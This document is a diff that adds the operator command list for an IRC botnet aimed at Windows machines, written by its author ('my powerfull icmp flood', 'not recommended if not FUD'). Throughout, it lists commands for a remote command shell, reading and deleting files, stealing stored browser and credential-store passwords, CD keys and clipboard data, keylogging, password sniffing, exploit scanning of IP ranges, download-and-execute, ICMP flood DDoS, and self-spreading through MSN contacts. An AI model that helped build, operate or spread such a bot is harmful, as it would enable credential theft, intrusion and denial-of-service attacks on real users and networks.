@@ -1,0 +1,116 @@
+.hi      /login
+.bye     /logout
+.die     /kill bot (Will come back next reboot)
+.quitz   /quits irc
+.rem     /Removes bot for good (Wont ever come back)
+
+.log     /bot log
+.clearlog
+
+.prefix <character> /Change bot command prefix till next reboot
+.open <site/file> /Open a site or file with iexplorer.exe
+.dns <ip> /resolve dns
+.server <something.com:6667> /change server
+.visit <http://site/page.php> /Visit a site
+.gethost
+.system <reboot/shutdown> /Reboot or shutdown the computer
+.findfile <file> /does search for file
+.rename <file> <newfile>
+
+*********
+Irc cmds:
+*********
+.nick <nick>
+.join <chan>
+.part <chan>
+.raw <raw irc commands>
+.mirccmd <irc commands>
+.pm <nick/chan> <message>
+.mode <chan> <modes>
+
+**********
+Stats:
+**********
+.id       /bot id
+.ver      /version
+.rndnick  /random nick
+.secure   /secures system
+.unsecure /unsecures system
+.status   /Bot uptime
+.uptime   /Comp uptime
+.netinfo
+.sysinfo
+.driveinfo
+.procs   /Process's
+.who     /See whoes logged in
+
+***********
+Services:
+***********
+.tftpstop
+.httpstop
+.ftpdstop
+.logstop
+.ffstop   /findfile stop
+.secstop  /secure stop
+.reconnect
+.disconnect
+.testdlls
+.httpdserver
+.tftpserver
+
+***********
+Remote CMD:
+***********
+.opencmd  /open remote cmd
+.stopcmd  /close it
+.cmd <commands> /execute commands in this remote cmd shell
+.delete <C:\\file.exe> /delete a file
+.readfile <C:\\file.txt> /Read a files contents to you on irc
+
+***********
+Threads:
+***********
+.threads  /list threads
+.killthread <id/all>
+.kill <id/proc>
+.killproc <id/proc>
+
+***********
+Stealers:
+***********  
+.cdkeys    /Steal cd keys 
+.getclip   /Steal clip board data
+.pstore    /Steal IE and credentials store passwords
+.firefox   /Steal FireFox 1, 2 and 3 passwords
+.psniff <channel/off> /Starts pass sniffer and outputs to selected channel.
+.keylog <pay/normal> /Starts and stops the keylogger
+
+***********
+Scanning:
+***********
+.scanstop
+.scanstats
+.curip
+.scan <exploit> <threads> <timeout> <time for> <iprange> /eg: .scan vnc 50 5 900 81.x.x.x
+
+***********
+Net commands
+***********
+.net <stop/pause/continue/delete/share/user/send> /Windows net commands
+
+***********
+download:
+***********
+.dl <http://site.com/file.exe> <C:\\file.exe> <1/0> /Download a file (1 = execute | 2 = dont execute)
+.update <http> <randomchar> /update to new bot (not recommended if not FUD)
+
+***********
+DDoS shit:
+***********
+.killit <ip> <time for in secconds>  /Sends my powerfull icmp flood to target ip for time selected
+
+***********
+Spreads:  
+***********
+.msn /Sends random message from msn.cpp with bot file to all online contacts
